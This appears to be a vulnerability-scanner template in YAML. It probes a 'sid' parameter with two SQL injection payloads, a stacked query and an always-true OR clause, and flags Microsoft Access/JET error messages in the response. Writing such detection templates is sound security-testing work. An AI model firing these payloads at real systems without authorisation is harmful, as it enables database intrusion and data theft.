id: sqli2-access-12
name: 'SQLi error access via sid'
severity: high
type: active
tags:
  - sqli
  - injection
  - access
description: 'Triggers access error via sid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      sid:
        - '''; SELECT 1--'
        - ''' OR ''1''=''1'
    matchers:
      - type: regex
        part: body
        regex:
          - 'Microsoft JET'
          - 'ODBC Microsoft Access'
